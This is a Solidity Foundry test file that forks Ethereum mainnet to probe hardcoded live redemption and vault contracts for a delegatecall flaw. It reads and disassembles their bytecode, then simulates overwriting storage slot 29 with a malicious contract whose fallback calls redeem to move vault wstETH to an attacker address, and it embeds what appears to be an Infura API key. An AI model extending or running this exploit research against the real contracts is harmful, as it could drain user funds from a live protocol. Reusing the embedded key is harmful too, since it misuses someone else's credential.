// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract Slot29Exploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_CheckSlot29() public view {
        console.log("=== CHECKING SLOT 29 IN REDEMPTION_0 ===\n");

        bytes32 slot29 = vm.load(REDEMPTION_0, bytes32(uint256(29)));
        console.log("Slot 29:");
        console.logBytes32(slot29);

        address addr29 = address(uint160(uint256(slot29)));
        console.log("As address:", addr29);

        if (addr29 != address(0) && addr29.code.length > 0) {
            console.log("Code size:", addr29.code.length);
            console.log("*** THIS IS THE DELEGATECALL TARGET ***");
        }

        // Check surrounding slots
        console.log("\nSurrounding slots:");
        for (uint i = 25; i < 35; i++) {
            bytes32 slot = vm.load(REDEMPTION_0, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
            }
        }
    }

    function test_FindDelegatecallAt5323Context() public view {
        console.log("=== FINDING DELEGATECALL AT 5323 CONTEXT ===\n");

        bytes memory code = REDEMPTION_0.code;

        // Look at what happens around 5280-5350
        console.log("Bytecode around 5323:");

        uint i = 5250;
        while (i < 5400 && i < code.length) {
            uint8 op = uint8(code[i]);
            uint skipBytes = 0;

            if (op == 0x54) console.log(i, "SLOAD");
            if (op == 0x55) console.log(i, "SSTORE");
            if (op == 0xf1) console.log(i, "CALL");
            if (op == 0xf4) console.log(i, "DELEGATECALL");
            if (op == 0xf5) console.log(i, "CREATE2");
            if (op == 0x33) console.log(i, "CALLER");
            if (op == 0x14) console.log(i, "EQ");

            if (op >= 0x60 && op <= 0x7f) {
                uint8 size = op - 0x5f;
                uint256 val = 0;
                for (uint j = 0; j < size && i + 1 + j < code.length; j++) {
                    val = val << 8 | uint8(code[i + 1 + j]);
                }
                if (size <= 4 && val < 100) console.log(i, "PUSH:", val);
                if (size == 4 && val > 0x1000) {
                    console.log(i, "PUSH4:");
                    console.logBytes4(bytes4(uint32(val)));
                }
                skipBytes = size;
            }

            i += 1 + skipBytes;
        }
    }

    function test_WhichFunctionTriggersSlot29Delegatecall() public view {
        console.log("=== WHICH FUNCTION TRIGGERS SLOT29 DELEGATECALL ===\n");

        // The DELEGATECALL at 5323 might be in finalizeRedeem or another function
        // Let's find what function jumps to code around 5323

        bytes memory code = REDEMPTION_0.code;

        // Find jump destinations near 5323
        console.log("Looking for JUMPDEST near 5323:");
        for (uint i = 5200; i < 5350 && i < code.length; i++) {
            if (uint8(code[i]) == 0x5b) { // JUMPDEST
                console.log("JUMPDEST at:", i);
            }
        }

        // Find what selector's jump targets lead here
        // The finalizeRedeem selector is 0xaff6cbf1
        console.log("\nfinalizeRedeem selector:");
        console.logBytes4(bytes4(keccak256("finalizeRedeem(uint256)")));
    }

    function test_SimulateDelegatecallToMalicious() public {
        console.log("=== SIMULATING DELEGATECALL TO MALICIOUS CONTRACT ===\n");

        // If we could control slot 29, we could make R0 delegatecall to our contract
        // Let's simulate this with vm.store

        // First deploy a malicious contract that calls RC.redeem
        MaliciousDelegatecallTarget mal = new MaliciousDelegatecallTarget(REDEMPTION_CONTROLLER, attacker);
        console.log("Malicious target deployed:", address(mal));

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        // Set slot 29 to our malicious contract
        vm.store(REDEMPTION_0, bytes32(uint256(29)), bytes32(uint256(uint160(address(mal)))));

        // Verify
        bytes32 newSlot29 = vm.load(REDEMPTION_0, bytes32(uint256(29)));
        console.log("New slot 29:", address(uint160(uint256(newSlot29))));

        // Now call a function that triggers the delegatecall at 5323
        vm.startPrank(attacker);
        deal(TASSET, attacker, 10000e18);
        IERC20(TASSET).approve(REDEMPTION_0, type(uint256).max);

        // Create redemption first
        REDEMPTION_0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));

        vm.warp(block.timestamp + 7 days);

        // Try finalize - this should trigger delegatecall to our malicious contract
        (bool s1, bytes memory d1) = REDEMPTION_0.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("\nfinalizeRedeem:", s1);
        if (!s1 && d1.length >= 4) console.logBytes4(bytes4(d1));

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerWst = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault after:", vaultAfter / 1e18);
        console.log("Attacker wstETH:", attackerWst / 1e18);

        if (attackerWst > 0) {
            console.log("\n*** EXPLOIT SUCCESSFUL ***");
        }
    }

    function test_FindSetterForSlot29() public view {
        console.log("=== FINDING SETTER FOR SLOT 29 ===\n");

        bytes memory code = REDEMPTION_0.code;

        // Look for SSTORE with slot 29
        // Pattern: PUSH 29, ... , SSTORE

        for (uint i = 0; i < code.length - 5; i++) {
            if (uint8(code[i]) == 0x55) { // SSTORE
                // Look back for PUSH 29
                for (uint j = (i > 20 ? i - 20 : 0); j < i; j++) {
                    if (uint8(code[j]) == 0x60 && uint8(code[j + 1]) == 29) {
                        console.log("Found SSTORE to slot 29 at:", i);
                        console.log("  PUSH1 29 at:", j);
                    }
                    if (uint8(code[j]) == 0x61) {
                        uint16 val = uint16(uint8(code[j + 1])) << 8 | uint8(code[j + 2]);
                        if (val == 29) {
                            console.log("Found SSTORE to slot 29 at:", i);
                            console.log("  PUSH2 29 at:", j);
                        }
                    }
                }
            }
        }

        console.log("\nIf no setters found, slot 29 might be set during initialization only");
    }
}

contract MaliciousDelegatecallTarget {
    address public rc;
    address public attacker;

    constructor(address _rc, address _attacker) {
        rc = _rc;
        attacker = _attacker;
    }

    fallback() external {
        // When called via delegatecall from REDEMPTION_0,
        // msg.sender is still the original caller
        // But we execute in REDEMPTION_0's context

        // Try to call RC.redeem to drain vault
        (bool success,) = rc.call(
            abi.encodeWithSignature("redeem(uint256,address)", 1000e18, attacker)
        );
    }
}
